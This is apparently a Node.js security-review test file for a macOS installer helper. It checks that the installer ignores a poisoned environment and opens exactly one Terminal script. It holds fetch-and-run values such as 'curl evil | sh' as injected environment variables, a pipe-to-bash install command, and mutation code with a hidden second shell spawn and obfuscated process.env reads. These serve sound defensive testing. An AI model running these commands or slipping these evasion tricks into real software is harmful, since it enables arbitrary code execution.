'use strict';
// Security review L1: the installer's command and "Plexiform runs one process"
// were only regex checks, which `process['env']` or a second destructured
// execFile got past. These check behaviour: with a poisoned environment the
// script is a frozen snapshot, and launch() makes exactly one child_process
// call, `open -a Terminal <file>`. The checks are also run against the
// reviewer's two mutations to prove they catch them. Env reads are caught by a
// process.env tripwire; the source regexes are only a lint, since computed keys,
// descriptors, string eval and ESM reach env without ever spelling it.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const cp = require('node:child_process');
const { testTempDir } = require('./helpers/tmp');

const SRC = path.join(__dirname, '..', 'src', 'ghostty-dock-install.js');
const CMD = 'curl -fsSL https://raw.githubusercontent.com/andrewbakercloudscale/ghossty-dock/main/get.sh | bash';
const SNAPSHOT = (file, dir) => [
  '#!/bin/zsh',
  'setopt pipefail',
  `/bin/mkdir '${dir}/started' 2>/dev/null || exit 0`,
  `/bin/rm -f '${file}'`,
  `trap '/bin/rm -rf '\\''${dir}'\\''' EXIT`,
  "print -r -- 'Plexiform opened this window to install Ghostty Dock, a third-party app by Andrew Baker (not part of Plexiform).'",
  "print -r -- 'See https://github.com/andrewbakercloudscale/ghossty-dock'",
  "print -r -- 'On macOS 13 or 14, install jq first: brew install jq'",
  "print -r -- ''",
  "print -r -- 'This will run:'",
  `print -r -- '  ${CMD}'`,
  "print -r -- ''",
  "print -r -- 'Press Return or type y to install; anything else cancels.'",
  'IFS= read -r reply || exit 1',
  "[[ -z $reply || $reply == [yY] ]] || { print -r -- 'Cancelled: nothing was installed.'; exit 1; }",
  CMD,
  'result=$?',
  "print -r -- ''",
  'if [ $result -eq 0 ]; then print -r -- \'Done. You can close this window; Plexiform will notice Ghostty Dock by itself.\'; else print -r -- "The installer stopped with code $result."; fi',
  'exit $result',
  '',
].join('\n');

const POISON = { PLX_CMD: 'curl evil | sh', GHOSTTY_DOCK_INSTALL: 'curl evil | sh', INSTALL_COMMAND: 'curl evil | sh', HOME: '/evil', PATH: '/evil', SHELL: '/evil/sh', TMPDIR: '/evil' };
const SPAWNERS = ['execFile', 'spawn', 'exec', 'fork', 'execSync', 'execFileSync', 'spawnSync'];

// Loads `srcFile` fresh with child_process stubbed and the env poisoned, then
// writes and "opens" a script in a temp folder. Returns what failed.
async function check(srcFile) {
  const problems = [];
  const calls = [];
  const saved = Object.fromEntries(SPAWNERS.map((k) => [k, cp[k]]));
  const env = { ...process.env };
  const root = testTempDir('px-dock-snap-');
  for (const k of SPAWNERS) {
    cp[k] = (...args) => {
      calls.push([k, args[0], args[1]]);
      const cb = args.find((a) => typeof a === 'function');
      if (cb) setImmediate(() => cb(null, '', ''));
      return { on() { return this; }, kill() {}, stdout: null, stderr: null };
    };
  }
  Object.assign(process.env, POISON);
  // Tripwire: the module needs no environment at all, so any read while it
  // loads, builds the script and launches fails, whatever syntax reached it
  // (computed keys, descriptors, Function/vm strings, ESM `import process`).
  const real = process.env;
  const reads = new Set();
  const note = (k) => { reads.add(String(k)); };
  process.env = new Proxy(real, {
    get(t, k) { note(k); return Reflect.get(t, k); },
    has(t, k) { note(k); return Reflect.has(t, k); },
    ownKeys(t) { note('<ownKeys>'); return Reflect.ownKeys(t); },
    getOwnPropertyDescriptor(t, k) { note(k); return Reflect.getOwnPropertyDescriptor(t, k); },
  });
  try {
    delete require.cache[require.resolve(srcFile)];
    const I = require(srcFile);
    if (I.INSTALL_COMMAND !== CMD) problems.push('INSTALL_COMMAND changed');
    const file = '/T/plexiform-terminal-X/continue.command';
    if (I.scriptBody(file, path.dirname(file)) !== SNAPSHOT(file, path.dirname(file))) problems.push('scriptBody differs from the snapshot');
    let opened = null;
    const r = await I.launch({ tempDir: root });
    process.env = real;
    if (reads.size) problems.push(`read the environment: ${JSON.stringify([...reads])}`);
    if (!r.ok) problems.push(`launch failed: ${r.error}`);
    if (calls.length !== 1) problems.push(`expected one child_process call, got ${JSON.stringify(calls)}`);
    else {
      const [kind, bin, args] = calls[0];
      if (kind !== 'execFile' || bin !== '/usr/bin/open' || !Array.isArray(args) || args.length !== 3 || args[0] !== '-a' || args[1] !== 'Terminal') problems.push(`unexpected call ${JSON.stringify(calls[0])}`);
      else opened = args[2];
    }
    if (opened) {
      const body = fs.readFileSync(opened, 'utf8');
      if (body !== SNAPSHOT(opened, path.dirname(opened))) problems.push('the written script differs from the snapshot');
      if (body.split('\n').filter((l) => l === CMD).length !== 1) problems.push('the command line is not there exactly once');
    }
    const src = fs.readFileSync(srcFile, 'utf8');
    const imports = src.match(/require\(\s*['"`](?:node:)?child_process['"`]\s*\)/g) || [];
    if (imports.length !== 1 || !src.includes("const { execFile } = require('node:child_process');")) problems.push('child_process import is not exactly { execFile }');
    for (const banned of [/process\.env/, /\benv\b/, /process\s*\[/, /globalThis/, /\bReflect\b/, /\beval\s*\(/, /\bFunction\s*\(/]) if (banned.test(src)) problems.push(`source uses ${banned}`);
  } finally {
    process.env = real;
    Object.assign(cp, saved);
    for (const k of Object.keys(process.env)) if (!(k in env)) delete process.env[k];
    Object.assign(process.env, env);
    delete require.cache[require.resolve(srcFile)];
    fs.rmSync(root, { recursive: true, force: true });
  }
  return problems;
}

function mutant(name, edit) {
  const dir = testTempDir(`px-dock-mut-${name}-`);
  const file = path.join(dir, 'ghostty-dock-install.js');
  const src = fs.readFileSync(SRC, 'utf8');
  const out = edit(src);
  assert.notEqual(out, src, `mutation ${name} applied`);
  fs.writeFileSync(file, out);
  return { file, dir };
}

test('with a poisoned env, the script is the frozen snapshot and launch makes exactly one call: open -a Terminal <file>', async () => {
  assert.deepEqual(await check(SRC), []);
});

test('the checks catch the reviewer\'s mutations', async () => {
  const env = mutant('env', (s) => s.replace('    INSTALL_COMMAND,\n', "    process['env'].PLX_CMD || INSTALL_COMMAND,\n"));
  const run2 = mutant('run2', (s) => s
    .replace("const { execFile } = require('node:child_process');", "const { execFile, execFile: run2 } = require('node:child_process');")
    .replace('  const s = writeScript({ tempDir, f });\n', "  const s = writeScript({ tempDir, f });\n  run2('/bin/bash', ['-c', INSTALL_COMMAND], () => {});\n"));
  try {
    const a = await check(env.file);
    assert.ok(a.some((p) => /snapshot/.test(p)) && a.includes(`source uses ${/process\s*\[/}`), JSON.stringify(a));
    const b = await check(run2.file);
    assert.ok(b.some((p) => /one child_process call/.test(p)) && b.some((p) => /exactly \{ execFile \}/.test(p)), JSON.stringify(b));
  } finally { for (const m of [env, run2]) fs.rmSync(m.dir, { recursive: true, force: true }); }
});

// Reads that dodge `process.env` / `process[`: destructuring, and the process module itself.
test('the source check also catches env reads that avoid process.env', async () => {
  const forms = {
    destructure: "(() => { const { env: e } = process; return e.PLX_CMD; })() || INSTALL_COMMAND",
    module: "require('node:process').env.PLX_CMD || INSTALL_COMMAND",
  };
  const ms = Object.entries(forms).map(([name, expr]) => mutant(name, (s) => s.replace('    INSTALL_COMMAND,\n', `    ${expr},\n`)));
  try {
    for (const m of ms) {
      const p = await check(m.file);
      assert.ok(p.some((x) => /^source uses .*env/.test(x)), `${m.file}: ${JSON.stringify(p)}`);
    }
  } finally { for (const m of ms) fs.rmSync(m.dir, { recursive: true, force: true }); }
});

const READ = (problems) => problems.find((p) => p.startsWith('read the environment: '));
// PLX_INSTALL_X is not in POISON and is unset during check(), so the snapshot
// cannot fail on these: only the tripwire can catch them.
const X = 'PLX_INSTALL_X';
const TRIP_FORMS = {
  computedDestructure: `(() => { const { ['e' + 'nv']: e } = process; return e.${X}; })()`,
  requireBracket: `require('node:process')['e' + 'nv'].${X}`,
  descriptor: `Object.getOwnPropertyDescriptor(process, 'e' + 'nv').value.${X}`,
  functionCtor: `(() => {}).constructor('return proc' + 'ess.e' + 'nv')().${X}`,
};

// A file in ESM syntax that require() loads (Node 22). The comment spoofs the
// lint's exact-import check; child_process is reached through the default
// export at call time, so the stubs apply and nothing real is spawned.
function esmMutant() {
  const dir = testTempDir('px-dock-mut-esm-');
  const file = path.join(dir, 'ghostty-dock-install.mjs');
  const src = fs.readFileSync(SRC, 'utf8');
  const out = src
    .replace("'use strict';\n", '')
    .replace(
      "const fs = require('node:fs');\nconst os = require('node:os');\nconst path = require('node:path');\nconst { execFile } = require('node:child_process');\n",
      "import fs from 'node:fs';\nimport os from 'node:os';\nimport path from 'node:path';\nimport cp from 'node:child_process';\nimport process from 'node:process';\n// const { execFile } = require('node:child_process');\nconst execFile = (...a) => cp.execFile(...a);\n",
    )
    .replace('    INSTALL_COMMAND,\n', `    ((() => { const { ['e' + 'nv']: e } = process; return e.${X}; })()) || INSTALL_COMMAND,\n`)
    .replace(/^module\.exports = \{ (.*) \};$/m, 'export { $1 };');
  assert.notEqual(out, src);
  assert.ok(!/\brequire\(|module\.exports/.test(out.replace(/^\/\/.*$/gm, '')), 'ESM mutant is pure ESM');
  fs.writeFileSync(file, out);
  return { file, dir };
}

test('tripwire: the real module reads nothing from process.env', async () => {
  for (let i = 0; i < 3; i++) assert.equal(READ(await check(SRC)), undefined);
});

test('tripwire: env reads the regex cannot see are caught by behaviour', async () => {
  delete process.env[X];
  const ms = Object.entries(TRIP_FORMS).map(([name, expr]) => ({ name, ...mutant(name, (s) => s.replace('    INSTALL_COMMAND,\n', `    (${expr}) || INSTALL_COMMAND,\n`)) }));
  ms.push({ name: 'esmImportProcess', ...esmMutant() });
  try {
    for (const m of ms) {
      const p = await check(m.file);
      const hit = READ(p);
      assert.ok(hit && hit.includes(X), `${m.name}: ${JSON.stringify(p)}`);
      assert.ok(!p.some((x) => /snapshot/.test(x)), `${m.name} should only be caught by the tripwire: ${JSON.stringify(p)}`);
    }
  } finally { for (const m of ms) fs.rmSync(m.dir, { recursive: true, force: true }); }
});
